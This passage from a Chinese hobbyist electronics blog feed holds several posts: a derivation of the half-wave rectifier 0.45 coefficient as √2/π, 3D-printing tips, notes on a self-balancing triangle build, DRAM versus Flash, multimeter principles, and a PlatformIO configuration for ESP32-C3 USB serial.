    <content type="html"><![CDATA[<p>不是说半波整流 输入有效值 *0.45= 输出平均值吗<br>然后问 AI 又说不对，是 *π</p><p><img src="https://cdn.jiecs.top/img/2025/04/709-Screenshot_20250412-013824_%E8%85%BE%E8%AE%AF%E5%85%83%E5%AE%9D.webp" alt="Screenshot_20250412-013824_腾讯元宝"></p><p><img src="https://cdn.jiecs.top/img/2025/tg_import_2025-04-02/photo_185@08-03-2025_21-52-44.jpg" alt="photo_185@08-03-2025_21-52-44.jpg"></p><p>AI 被误导了。于是发现这是一个“有效值”和“平均值”的问题。然后我又想，这道题的最大反向就是在问峰值电压，那还要 有效值 *√2<br>又一算，就发现<br>√2&#x2F;0.45≈3.14269<br>不就是 π 吗？太神奇了<br>那就是说“0.45”更准确的值应该是 0.4501581580785<br>即 √2&#x2F;π</p><p>再往下钻研的话：</p><blockquote><p>以下由 Gemini&#96; 2.5 Pro 推导：</p></blockquote><h2 id="1-理解交流电压-AC"><a href="#1-理解交流电压-AC" class="headerlink" title="1. 理解交流电压 (AC)"></a>1. 理解交流电压 (AC)</h2><p><strong>波形：</strong> 我们通常接触的交流电（比如市电）的电压是随时间变化的，其波形是正弦波（Sine Wave）。</p><p><strong>数学表示：</strong> 瞬时电压可以表示为：</p><p>$$<br>v(t) &#x3D; V_p \cdot \sin(\omega t)<br>$$</p><p>其中：</p><ul><li>$v(t)$：表示在时间 $t$ 的瞬时电压值。</li><li>$V_p$：表示峰值电压（Peak Voltage），也就是正弦波能达到的最大电压值。</li><li>$\sin()$：是三角函数中的正弦函数，它描述了电压如何随时间周期性变化。</li><li>$\omega$：是角频率（Angular Frequency），它与电源的频率 $f$（比如中国的 50Hz）有关，$\omega &#x3D; 2\pi f$。</li><li>$\omega t$：代表相位角，表示在时间 $t$ 时波形进行到了哪个阶段。一个完整的周期是 $2\pi$ 弧度（或 360 度）。</li></ul><p><strong>有效值（RMS）：</strong> 我们通常说的“220V交流电”，这个 220V 指的是有效值（Root Mean Square, RMS），而不是峰值。有效值是根据交流电产生的热效应来定义的，它等于一个产生相同热效应的直流电压的值。</p><p><strong>峰值与有效值的关系：</strong> 对于正弦波，峰值电压 $V_p$ 和有效值电压 $V_{\text{rms}}$ 的关系是：</p><p>$$<br>V_p &#x3D; V_{\text{rms}} \cdot \sqrt{2}<br>$$</p><p>或者：</p><p>$$<br>V_{\text{rms}} &#x3D; \frac{V_p}{\sqrt{2}}<br>$$</p><hr><h2 id="2-理解半波整流-Half-Wave-Rectification"><a href="#2-理解半波整流-Half-Wave-Rectification" class="headerlink" title="2. 理解半波整流 (Half-Wave Rectification)"></a>2. 理解半波整流 (Half-Wave Rectification)</h2><p><strong>目的：</strong> 将交流电（AC）转换为脉动的直流电（Pulsating DC）。</p><p><strong>原理：</strong> 通常使用一个二极管（Diode）来实现。二极管具有单向导电性，只允许电流朝一个方向流动。</p><p><strong>过程：</strong></p><ul><li>当交流电压处于正半周时（电压为正），二极管导通，电流流过负载，负载上得到正弦波的正半部分。</li><li>当交流电压处于负半周时（电压为负），二极管截止，没有电流流过负载，负载上的电压为零。</li></ul><p><strong>输出波形：</strong> 输出不再是完整的正弦波，而是只有正半周的波形，负半周被“砍掉”了，变成了零。在一个周期内，有一半时间有电压输出（形状是半个正弦波），另一半时间输出为零。</p><hr><h2 id="3-计算输出电压的平均值（Average-DC-Value）"><a href="#3-计算输出电压的平均值（Average-DC-Value）" class="headerlink" title="3. 计算输出电压的平均值（Average DC Value）"></a>3. 计算输出电压的平均值（Average DC Value）</h2><p>我们关心的是整流后得到的“直流”分量是多少。对于这种脉动的电压，我们通常计算其平均值（Average Value），这代表了在一个完整周期内电压的平均效果。这个平均值就是我们通常用直流电压表测量的数值。</p><p><strong>为什么要计算平均值？</strong> 因为输出电压虽然方向不变（都是正的或零），但大小是不断变化的。平均值能代表这个脉动直流电压的整体“强度”。</p><p><strong>如何计算平均值？</strong> 对于周期性变化的量，计算平均值需要用到积分（Integration）。</p><hr><h2 id="4-理解积分符号-∫"><a href="#4-理解积分符号-∫" class="headerlink" title="4. 理解积分符号 ∫"></a>4. 理解积分符号 ∫</h2><p><strong>积分的本质：</strong> 积分符号 ∫ 可以理解为 <strong>“求和（Summation）”</strong> 的意思，但不是简单地把几个数加起来，而是把连续变化的量在某个范围内的无穷小片段累加起来。</p><p><strong>几何意义：</strong> 在函数图像上，定积分 $\int_a^b f(x) , dx$ 计算的是函数 $f(x)$ 的曲线在 $x&#x3D;a$ 到 $x&#x3D;b$ 这段区间与 $x$ 轴所围成的面积。</p><p>解释如下：</p><ul><li>$\int$：积分符号，像一个拉长的 S（Summation 的首字母）。</li><li>$a$ 和 $b$：积分的下限和上限，表示我们关心的范围。</li><li>$f(x)$：被积分的函数，也就是我们想要累加的那个连续变化的量（在这里是瞬时电压 $v_{\text{out}}(t)$）。</li><li>$dx$（或 $dt$，$d(\omega t)$）：表示一个无穷小的片段（无穷小的宽度）。$f(x)dx$ 可以看作是一个极窄的矩形面积（高是 $f(x)$，宽是 $dx$）。积分就是把无数个这样的小矩形面积加起来。</li></ul><hr><h2 id="5-推导过程"><a href="#5-推导过程" class="headerlink" title="5. 推导过程"></a>5. 推导过程</h2><p>我们要计算半波整流后输出电压 $v_{\text{out}}(t)$ 在一个完整周期 $T$（或 $2\pi$ 弧度）内的平均值 $V_{\text{avg}}$。</p><p><strong>输出电压 $v_{\text{out}}(t)$ 在一个周期 $[0, 2\pi]$ 内的情况：</strong></p><ul><li>当 $0 \leq \omega t \leq \pi$（前半个周期）： $v_{\text{out}}(\omega t) &#x3D; V_p \cdot \sin(\omega t)$</li><li>当 $\pi \leq \omega t \leq 2\pi$（后半个周期）： $v_{\text{out}}(\omega t) &#x3D; 0$</li></ul><p><strong>平均值的计算公式：</strong></p><p>$$<br>V_{\text{avg}} &#x3D; \frac{1}{2\pi} \int_0^{2\pi} v_{\text{out}}(\omega t) , d(\omega t)<br>$$</p><p>将积分区间分成两部分：</p><p>$$<br>V_{\text{avg}} &#x3D; \frac{1}{2\pi} \left[ \int_0^{\pi} V_p \cdot \sin(\omega t) , d(\omega t) + \int_{\pi}^{2\pi} 0 \cdot d(\omega t) \right]<br>$$</p><p>第二部分为 0，所以只需要计算第一部分：</p><p>$$<br>V_{\text{avg}} &#x3D; \frac{1}{2\pi} \int_0^{\pi} V_p \cdot \sin(\omega t) , d(\omega t)<br>$$</p><p>积分结果（微积分知识）：</p><p>$$<br>\int_0^{\pi} V_p \cdot \sin(\omega t) , d(\omega t) &#x3D; V_p \cdot [-\cos(\omega t)]_0^{\pi}<br>&#x3D; V_p \cdot \left[ -\cos(\pi) + \cos(0) \right]<br>&#x3D; V_p \cdot [1 + 1] &#x3D; 2 V_p<br>$$</p><p>代回平均值公式：</p><h2 id="V-text-avg-frac-1-2-pi-cdot-2-V-p-frac-V-p-pi"><a href="#V-text-avg-frac-1-2-pi-cdot-2-V-p-frac-V-p-pi" class="headerlink" title="$$V_{\text{avg}} &#x3D; \frac{1}{2\pi} \cdot 2 V_p &#x3D; \frac{V_p}{\pi}$$"></a>$$<br>V_{\text{avg}} &#x3D; \frac{1}{2\pi} \cdot 2 V_p &#x3D; \frac{V_p}{\pi}<br>$$</h2><h4 id="分解解释："><a href="#分解解释：" class="headerlink" title="分解解释："></a>分解解释：</h4><h5 id="1-为什么区间算平均值要除以-2-pi-？这涉及到如何计算一个周期函数在一个完整周期内的平均值。"><a href="#1-为什么区间算平均值要除以-2-pi-？这涉及到如何计算一个周期函数在一个完整周期内的平均值。" class="headerlink" title="1. 为什么区间算平均值要除以 $2\pi$？这涉及到如何计算一个周期函数在一个完整周期内的平均值。"></a>1. 为什么区间算平均值要除以 $2\pi$？这涉及到如何计算一个周期函数在一个完整周期内的平均值。</h5><p><strong>基本平均值概念</strong>：回想一下计算一组离散数字（比如 5, 8, 2）的平均值，你会把它们加起来（$5 + 8 + 2 &#x3D; 15$），然后除以数字的个数（3），得到平均值 $15 &#x2F; 3 &#x3D; 5$。</p><p><strong>推广到连续函数</strong>：对于随时间（或角度）连续变化的量，比如电压 $v(t)$，我们不能简单地“数个数”。但是，我们可以用积分来“累加”这些连续变化的值在一个区间内的总量。</p><p>积分 $\int_a^b f(x), dx$ 计算的是函数 $f(x)$ 在区间 $[a, b]$ 上的“累积效应”或者说曲线下方的“面积”。</p><p><strong>平均值的定义</strong>：一个函数 $f(x)$ 在区间 $[a, b]$ 上的平均值，定义为该区间上的积分值除以该区间的长度。</p><p>$$<br>\text{平均值} &#x3D; \frac{1}{b - a} \int_a^b f(x), dx<br>$$</p><p><strong>应用到我们的问题</strong>：</p><p>我们计算的是半波整流后输出电压 $v_{\text{out}}(\omega t)$ 的平均值。<br>我们关心的是在一个完整的输入交流电周期内的平均表现。<br>交流电的完整周期，在用角度 $\omega t$ 表示时，是从 $0$ 到 $2\pi$ 弧度（相当于 $0$ 到 $360^\circ$）。</p><p>所以，我们计算平均值的区间是 $[0, 2\pi]$。<br>这个区间的长度是 $2\pi - 0 &#x3D; 2\pi$。</p><p><strong>结论</strong>：因此，为了计算 $v_{\text{out}}(\omega t)$ 在一个完整周期（$0$ 到 $2\pi$）内的平均值 $V_{\text{avg}}$，我们需要计算电压在这个周期内的总积分（即 $\int_0^{2\pi} v_{\text{out}}(\omega t), d(\omega t)$），然后除以这个周期的长度 $2\pi$。</p><p>$$<br>V_{\text{avg}} &#x3D; \frac{1}{2\pi} \int_0^{2\pi} v_{\text{out}}(\omega t), d(\omega t)<br>$$</p><p><strong>简单类比</strong>：想象一下你在测量一条长度为 $2\pi$ 米的弯曲路径的海拔高度。$v_{\text{out}}(\omega t)$ 就像是在路径上每一点的海拔高度。</p><p>积分 $\int_0^{2\pi} v_{\text{out}}(\omega t), d(\omega t)$ 就好像是计算了这条路径“海拔高度-路径长度”图下方的总面积。</p><p>为了得到这条路径的“平均海拔”，你需要用这个总面积除以路径的总长度 $2\pi$。</p><hr><blockquote><p>注，另一种方法：求面积的奇特方法，你绝对没见过 UP主: 仙童数学 - <a href="https://www.bilibili.com/video/BV1nv4y1F7yQ">https://www.bilibili.com/video/BV1nv4y1F7yQ</a></p></blockquote><h5 id="2-详细讲解积分计算部分：-int-0-pi-V-p-cdot-sin-omega-t-d-omega-t-2V-p"><a href="#2-详细讲解积分计算部分：-int-0-pi-V-p-cdot-sin-omega-t-d-omega-t-2V-p" class="headerlink" title="2. 详细讲解积分计算部分：$\int_0^\pi V_p \cdot \sin(\omega t), d(\omega t) &#x3D; 2V_p$"></a>2. 详细讲解积分计算部分：$\int_0^\pi V_p \cdot \sin(\omega t), d(\omega t) &#x3D; 2V_p$</h5><p>这部分计算的是正半周（即 $\omega t$ 从 $0$ 到 $\pi$）电压波形下的面积。我们一步步来：</p><p><strong>1. 确定被积函数和积分变量</strong>：<br>我们要积分的函数是 $V_p \cdot \sin(\omega t)$。<br>积分是关于变量 $\omega t$ 进行的。</p><p>$V_p$ 是峰值电压，它是一个常数，不随 $\omega t$ 变化。</p><p><strong>2. 提出常数</strong>：根据积分的性质，常数因子可以提到积分符号外面：</p><p>$$<br>\int_0^\pi V_p \cdot \sin(\omega t), d(\omega t) &#x3D; V_p \cdot \int_0^\pi \sin(\omega t), d(\omega t)<br>$$</p><p>现在我们只需要关注 $\int_0^\pi \sin(\omega t), d(\omega t)$ 这个积分。</p><hr><p><strong>3. 找到不定积分（反导数）</strong>：</p><p>我们需要找到一个函数，它的导数（相对于 $\omega t$）是 $\sin(\omega t)$。<br>我们知道 $\cos(x)$ 的导数是 $-\sin(x)$。<br>那么 $-\cos(x)$ 的导数就是 $-(-\sin(x)) &#x3D; \sin(x)$。<br>所以，$\sin(\omega t)$ 的一个不定积分（反导数）是 $-\cos(\omega t)$。</p><hr><p><strong>4. 应用牛顿-莱布尼茨公式（微积分基本定理）</strong>：</p><p>这个定理告诉我们如何计算定积分。如果 $F(x)$ 是 $f(x)$ 的一个反导数，那么：</p><p>$$<br>\int_a^b f(x), dx &#x3D; F(b) - F(a)<br>$$</p><p>这里的 $[F(x)]_a^b$ 记号就表示 $F(b) - F(a)$。</p><p>在我们的例子中，$f(\omega t) &#x3D; \sin(\omega t)$，反导数 $F(\omega t) &#x3D; -\cos(\omega t)$，积分区间是 $[0, \pi]$。</p><p>所以，</p><p>$$<br>\int_0^\pi \sin(\omega t), d(\omega t) &#x3D; [-\cos(\omega t)]_0^\pi<br>$$</p><p>这表示：</p><p>$$<br>[-\cos(\pi)] - [-\cos(0)]<br>$$</p><hr><p><strong>5. 计算三角函数值</strong>：</p><p>$\cos(\pi)$ （180度的余弦值）$&#x3D; -1$</p><p>$\cos(0)$ （0度的余弦值）$&#x3D; 1$</p><hr><p><strong>6. 代入计算</strong>：</p><p>$$<br>[-(-1)] - [-1] &#x3D; 1 - (-1) &#x3D; 1 + 1 &#x3D; 2<br>$$</p><hr><p><strong>7. 乘回常数 $V_p$</strong>：</p><p>不要忘了我们在第2步提出的常数 $V_p$。</p><p>$$<br>V_p \cdot \int_0^\pi \sin(\omega t), d(\omega t) &#x3D; V_p \cdot 2 &#x3D; 2V_p<br>$$</p><hr><p><strong>总结这个部分</strong>：</p><p>计算 $\int_0^\pi V_p \cdot \sin(\omega t), d(\omega t)$ 的过程是：</p><ul><li>把常数 $V_p$ 提出来。</li><li>找到 $\sin(\omega t)$ 的反导数 $-\cos(\omega t)$。</li><li>用牛顿-莱布尼茨公式，计算反导数在上限 $\pi$ 的值减去在下限 0 的值：$[-\cos(\pi)] - [-\cos(0)] &#x3D; 2$。</li><li>将提出的常数 $V_p$ 乘回去，得到 $2V_p$。</li></ul><p>这个 $2V_p$ 就是半波整流后，在一个周期内有电压输出的那部分（正弦波的正半拱）下方的面积。</p><p>将这个面积除以整个周期的长度 $2\pi$，就得到了平均电压：</p><p>$$<br>V_{\text{avg}} &#x3D; \frac{2V_p}{2\pi} &#x3D; \frac{V_p}{\pi}<br>$$</p><p>分解完成</p><hr><p>下一步，<strong>将结果与输入有效值 $V_{\text{rms}}$ 联系起来：</strong></p><p>已知：</p><p>$$<br>V_p &#x3D; V_{\text{rms}} \cdot \sqrt{2}<br>$$</p><p>代入上式：</p><p>$$<br>V_{\text{avg}} &#x3D; \frac{V_{\text{rms}} \cdot \sqrt{2}}{\pi}<br>$$</p><p><strong>计算系数：</strong></p><ul><li>$\sqrt{2} \approx 1.414$</li><li>$\pi \approx 3.14159$</li></ul><p>所以：</p><p>$$<br>\frac{\sqrt{2}}{\pi} \approx \frac{1.414}{3.14159} \approx 0.4501…<br>$$</p><hr><h2 id="最终结论："><a href="#最终结论：" class="headerlink" title="最终结论："></a>最终结论：</h2><p>$$<br>V_{\text{avg}} \approx 0.45 \cdot V_{\text{rms}}<br>$$</p><hr><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>半波整流后的平均直流电压 $V_{\text{avg}}$ 大约是输入交流电压有效值 $V_{\text{rms}}$ 的 0.45 倍。这个 0.45 的系数来源于：</p><ul><li>计算的是整流后波形在一个完整周期内的平均值。</li><li>这个平均值是通过积分（累加瞬时值）得到的。积分计算的是正弦波正半周下的面积 $2V_p$。</li><li>将这个面积除以整个周期 $2\pi$ 得到平均高度 $V_p &#x2F; \pi$。</li><li>最后将峰值电压 $V_p$ 替换为用有效值 $V_{\text{rms}}$ 表示，得到：</li></ul><p>$$<br>V_{\text{avg}} &#x3D; \frac{\sqrt{2}}{\pi} \cdot V_{\text{rms}} \approx 0.45 \cdot V_{\text{rms}}<br>$$</p><hr><h2 id="重要提示："><a href="#重要提示：" class="headerlink" title="重要提示："></a>重要提示：</h2><ul><li>这个推导假设使用的是理想二极管，即没有正向压降。实际的硅二极管大约有 0.6V 到 0.7V 的正向压降，所以在低电压情况下，实际输出的平均电压会比理论值稍低。</li><li>输出的是脉动直流，而不是平滑的直流。如果需要平滑的直流，通常还需要加上滤波电容。</li></ul>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习</tag>
      
      <tag>AI</tag>
      
      <tag>电子</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>3D 打印小技巧</title>
    <link href="/archives/cd79a4e3/"/>
    <url>/archives/cd79a4e3/</url>
    
    <content type="html"><![CDATA[<ul><li><strong>自适应层高：</strong> 兼顾速度与精度，但突变层高会显得不干净。</li><li><strong>墙序：</strong> 先外后内（质量-高级-墙顺序），提升外墙平整度，牺牲悬垂。</li><li><strong>连接件宜用弹性连接：</strong> 硬连接间隙不好调。参考 3D打印零件设计技巧—结构设计篇(二) - <a href="https://www.bilibili.com/video/BV18r421K7KG">https://www.bilibili.com/video/BV18r421K7KG</a> 3:55 处</li><li><strong>Z 方向的沉头孔：</strong> 搭桥易乱，可加斜面，用平头螺丝。</li><li><strong>减少空驶：</strong> <ul><li>开“避免跨越外墙”（质量-高级），最大绕行 300。</li><li>用“逐件打印”（其他-特殊模式-打印顺序）。</li></ul></li><li><strong>边角处缺口&#x2F;破洞，表面不平整：</strong><ul><li>需要校准，尤其是流量校准。</li></ul></li><li><strong>打印提速：</strong><ul><li>参考：这几个3D打印进阶技巧请收好，助你玩转3D打印！ - <a href="https://www.bilibili.com/video/BV1B1yVYRE1y">https://www.bilibili.com/video/BV1B1yVYRE1y</a> 5:00 处</li><li>用闪电填充（次选线填充），填充密度调低到 5-8%</li><li>合并填充&amp;识别狭窄内部实心填充（强度 - 高级）。对窄墙后者很有用。</li><li>打印单个大零件，可以“回抽时抬升 Z”（打印机编辑 - 挤出机设置）调零。</li></ul></li><li><strong>关于搭桥：</strong><ul><li>搭桥质量与冷却密切相关。但注意：搭桥部分，默认就是风扇全部拉满的，风扇也就那个样子了。有说法说，P1 的风道设计不好，风铺不开，可以把模型搭桥的部分放到更靠里面一点的地方。也可以稍微降低一点温度。</li><li>其次就是：</li><li>桥接线下坠——调大桥接速度、调小桥接流量。</li><li>桥接线被拉断——调小桥接速度、可开启厚桥。</li><li>桥接不成完整面，一根一根的——桥接流量1.5、调小桥接速度。</li><li>参考：如何打印完美的无支撑桥接？ UP主: 安利歪歪 - <a href="https://www.bilibili.com/video/BV1JVpHzYExX">https://www.bilibili.com/video/BV1JVpHzYExX</a></li></ul></li><li><strong>建模时就要考虑便于生产：</strong><ul><li>保证强度：加强筋作用不大。主要是连接件不要太薄，可以直接把整个面拉起来，做成大块实体，拉大圆角</li><li>XY 方向上的横向长圆柱挖槽可能打不圆，可以在圆的上方做两条互相垂直的切线，形成水滴形状的挖槽。也可再把水滴上方填平拉桥。</li><li>在模型的各个方向上都加圆角，能很好地补偿直角溢出和象脚。</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于自平衡三角-迷你三棱柱复现</title>
    <link href="/archives/3edc7153/"/>
    <url>/archives/3edc7153/</url>
    
    <content type="html"><![CDATA[<p><a href="https://oshwhub.com/bonus/mi-ni-zi-ping-heng-san-ling-zhu-2">https://oshwhub.com/bonus/mi-ni-zi-ping-heng-san-ling-zhu-2</a></p><pre><code class=" mermaid">flowchart LR;    %% Main components    MTG[&quot;自平衡三角-迷你三棱柱复现&quot;]    MTG ----&gt; MCU[&quot;MCU (LGT8F32P)&quot;]    MTG ---&gt; Power[&quot;电源管理&quot;]    Power --&gt; Battery[(&quot;3.7V-4.2V 电池&quot;)]    Battery ---&gt; DCDC5V[&quot;5V 升压 DCDC&quot;]    Battery ---&gt; DCDC12V[&quot;12V 升压 DCDC&quot;]    Battery -.-&gt; NoteBatt([&quot;电池重量比较影响功能&quot;])    DCDC5V -. 供电 .-&gt; MCU    DCDC5V -. 供电 .-&gt; IMU    DCDC5V -. 供电 .-&gt; SCREEN        %% Sensors    MCU &lt;--&gt; IMU[&quot;MPU6050 位姿感测&quot;]    MCU --&gt; SCREEN[&quot;SSD1309 IIC 小屏幕&quot;]    SCREEN -.-&gt; NoteScreen([&quot;用于在没有无线通讯功能时显示数据参数&quot;])        %% Algorithms    MCU --&gt; PID[&quot;PID&quot;]    PID --&gt; PidSim[&quot;PID 模拟 pid-simulator-web.skythinker.top&quot;]    PID --&gt; PIDImpl[&quot;需要串级 PID，速度环PD、位置环 PI&quot;]    PIDImpl --&gt; PIDImplDesc[&quot;I（积分累计）反映对持续干扰的控制能力，对于自平衡三角是必要的，因为稳态的三角不能来回摇摆&quot;]    PID -...-&gt; OtherAlgos[&quot;其他控制算法&quot;]    OtherAlgos --&gt; LQR[&quot;LQR (线性二次调节器)&quot;]    OtherAlgos --&gt; MPC[&quot;MPC (模型预测控制)&quot;]        %% Power details    DCDC12V --&gt; Cap12V[&quot;12V 滤波电容&quot;]    Cap12V -.- NoteCap([&quot;比较重要，电机启动负载大，电池拖不动，会导致电机有时能启动有时不能启动&quot;])    DCDC12V -. 供电 .-&gt; Moter[&quot;12V 8p 带编码器无刷电机&quot;]    PID -..-&gt; Moter</code></pre><p>电池重量很影响平衡效果<br>PID 的 I 不能完全丢掉，稳态是需要单方向持续运转的<br>PID 模拟学习： <a href="https://pid-simulator-web.skythinker.top/">https://pid-simulator-web.skythinker.top</a></p><p>需要从合适位置摆入，有合适初始状态，才能稳定</p><p>只用PID?加上前馈解决95%的问题！ UP主: 华南小虎队 - <a href="https://www.bilibili.com/video/BV19T411t7du">https://www.bilibili.com/video/BV19T411t7du</a></p><p>除了PID还有各种算法：PID、LQR、MPC实时控制倒立摆仿真对比 UP主: 西格螺丝 - <a href="https://www.bilibili.com/video/BV17j41167RL">https://www.bilibili.com/video/BV17j41167RL</a></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>电子</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Flash 和 DRAM</title>
    <link href="/archives/e9eab5fd/"/>
    <url>/archives/e9eab5fd/</url>
    
    <content type="html"><![CDATA[<p>DRAM（如DDR内存）中使用<strong>电容</strong>： 在动态随机存取存储器（DRAM）中，使用了电容器来存储数据。每个存储单元由一个电容器和一个晶体管组成。然而，由于电容器的电荷会泄漏，DRAM 需要周期性地刷新数据，以维持其存储状态。这使得 DRAM 成为一种易失性存储器。</p><p>Flash 存储（如SSD）中使用<strong>浮栅晶体管</strong>： 浮栅晶体管被用于闪存（Flash Memory）中，能够在没有电源的情况下长期保存数据，这是因为浮栅上的电荷不会轻易泄漏。</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>万用表的运作原理</title>
    <link href="/archives/b516c161/"/>
    <url>/archives/b516c161/</url>
    
    <content type="html"><![CDATA[<h4 id="1-测电阻（Ω档）"><a href="#1-测电阻（Ω档）" class="headerlink" title="1. 测电阻（Ω档）"></a><strong>1. 测电阻（Ω档）</strong></h4><ul><li><strong>原理</strong>：<em><strong>恒流+测电压+自动除</strong></em> 万用表自动输出一个小电流（即恒流电源，约1mA），然后测电阻上的电压，自动算出阻值。  </li><li>必须<strong>断电测</strong><ul><li>如果不断电，万用表输出的电流 + 外部电路的电压 → <strong>电压叠加</strong>，导致计算出的电阻值不对！小电阻会测出大阻值。</li><li><strong>电流源初始电压</strong>通常1.5V~9V，量程&#x2F;档位越大，电压越高。 如果被测电路本身带电（比如电容没放电），高电压叠加外部电压，可能“烧表”。</li></ul></li><li>手<strong>同时</strong>碰两表笔，人体电阻会影响结果，所测电阻越大影响越大。</li></ul><hr><h4 id="2-测二极管（二极管档-蜂鸣档）"><a href="#2-测二极管（二极管档-蜂鸣档）" class="headerlink" title="2. 测二极管（二极管档 &#x2F; 蜂鸣档）"></a><strong>2. 测二极管（二极管档 &#x2F; 蜂鸣档）</strong></h4><ul><li><strong>原理</strong>：<em><strong>恒流+测电压得压降</strong></em> 万用表输出固定电流，测二极管正向压降。  </li><li><strong>蜂鸣档</strong>：小于 30-100 欧时响。</li><li><strong>接法</strong>：  <ul><li><strong>数字表</strong>：红笔接二极管<strong>阳极（A）</strong>，黑笔接<strong>阴极（K）</strong> → 显示 <strong>0.5~0.7V（硅管）</strong> 或 <strong>0.2~0.3V（锗管）</strong>。  </li><li><strong>指针表</strong>：黑笔接<strong>阳极（A）</strong>，红笔接<strong>阴极（K）</strong> → 指针大幅摆动（低阻值）。</li></ul></li><li><strong>测LED不亮：</strong><ul><li>部分型号数字表输出电压不足，可能无法点亮高压降LED（如蓝光LED需3V以上）。  <ul><li><strong>解决方案</strong>：用高电阻档（×10k）提供更高电压（测试时间要短）。</li></ul></li></ul></li></ul><table><thead><tr><th><strong>功能</strong></th><th><strong>原理</strong></th><th><strong>红表笔接</strong></th><th><strong>黑表笔接</strong></th><th><strong>二极管正向接法</strong></th></tr></thead><tbody><tr><td><strong>数字</strong></td><td>恒流测压降</td><td>电源正</td><td>电源负</td><td>红→阳极，黑→阴极</td></tr><tr><td><strong>指针</strong></td><td>电池驱动表头偏转</td><td>电源负</td><td>电源正</td><td>黑→阳极，红→阴极</td></tr></tbody></table><hr><h4 id="3-测电压（V档）"><a href="#3-测电压（V档）" class="headerlink" title="3. 测电压（V档）"></a><strong>3. 测电压（V档）</strong></h4><ul><li><strong>直流（DC）</strong>：红笔接正极，黑笔接负极，直接读数。 <ul><li>相当于并一个10MΩ+级的大电阻（高端表阻值更大）。万用表内置ADC处理</li></ul></li><li><strong>交流（AC）</strong>：不分正负，显示有效值。</li></ul><hr><h4 id="4-测电容"><a href="#4-测电容" class="headerlink" title="4. 测电容"></a><strong>4. 测电容</strong></h4><ul><li><strong>最好离板测</strong>：离散电容、电感影响很大。</li><li><strong>要滞留时间长一点</strong>：多数百元级万用表基于充放电时间计算容值，充电放电要时间。</li></ul><hr><h4 id="5-不要悬空测"><a href="#5-不要悬空测" class="headerlink" title="5.不要悬空测"></a><strong>5.不要悬空测</strong></h4><ul><li>会测出莫名其妙的值</li></ul>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>学习</tag>
      
      <tag>电子</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于 LuatOS ESP32-C3 开发板在 PlatformIO 上串口无响应</title>
    <link href="/archives/1071b9e9/"/>
    <url>/archives/1071b9e9/</url>
    
    <content type="html"><![CDATA[<p><strong>理解问题核心：USB-CDC vs. UART</strong></p><ul><li><p><strong>USB-CDC（USB Communications Device Class）:</strong> ESP32芯片可以直接通过USB端口模拟一个串口设备，无需额外的USB转串口芯片。这种方式通常在较新的ESP32芯片上使用，并以“Espressif USB JTAG&#x2F;serial debug unit”的形式出现在电脑上。</p></li><li><p><strong>UART（Universal Asynchronous Receiver&#x2F;Transmitter）:</strong> ESP32芯片的UART引脚通过一个USB转串口芯片（如CH343K）连接到USB端口。这种方式在很多ESP32开发板上使用，电脑上会显示为CH343K或类似的名称。</p></li><li><p><strong><code>ARDUINO_USB_MODE</code>:</strong> 这个选项决定了ESP32的USB端口的工作模式。</p><ul><li><code>0</code>：表示“Hardware CDC and JTAG”模式，即硬件CDC（串口）和JTAG调试模式。</li><li><code>1</code>：表示“USB-OTG”模式，即USB On-The-Go模式。</li></ul></li><li><p><strong><code>ARDUINO_USB_CDC_ON_BOOT</code>:</strong> 这个选项决定了ESP32在启动时是否启用USB-CDC功能。</p><ul><li><code>0</code>：表示禁用USB-CDC。</li><li><code>1</code>：表示启用USB-CDC。</li></ul></li></ul><p>完整可用的 platformio.ini 配置:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">[env:esp32-c3-devkitm-1]</span><br>platform = espressif32<br>board = esp32-c3-devkitm-1<br>framework = arduino<br>board_build.flash_mode = dio<br>board_build.extra_flags =<br>-D ARDUINO_USB_MODE=1<br>-D ARDUINO_USB_CDC_ON_BOOT=0<br>debug_tool = esp-builtin<br>upload_protocol = esptool<br>monitor_speed = 115200<br></code></pre></td></tr></table></figure><p>某些仿的 ESP32-C3 开发板（非合宙官方）可以尝试 <code>board = airm2m_core_esp32c3</code></p><p>对于没有 UART 转串口，只通过 USB CDC 烧录的开发板，实际上也可以通过 USB 传输串口数据。需要设置 <code>CONFIG_ESP_CONSOLE_USB_SERIAL_JTAG</code>：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[env:airm2m_core_esp32c3]</span><br><span class="hljs-attr">platform</span> = espressif32<br><span class="hljs-attr">board</span> = airm2m_core_esp32c3<br><span class="hljs-attr">framework</span> = ardui<span class="hljs-literal">no</span><br><span class="hljs-attr">upload_protocol</span> = esptool<br><span class="hljs-attr">board_build.extra_flags</span> =<br>  -D <span class="hljs-attr">ARDUINO_USB_MODE</span>=<span class="hljs-number">1</span><br>  -D <span class="hljs-attr">ARDUINO_USB_CDC_ON_BOOT</span>=<span class="hljs-number">1</span><br>  -D <span class="hljs-attr">CONFIG_ESP_CONSOLE_USB_SERIAL_JTAG</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">monitor_speed</span> = <span 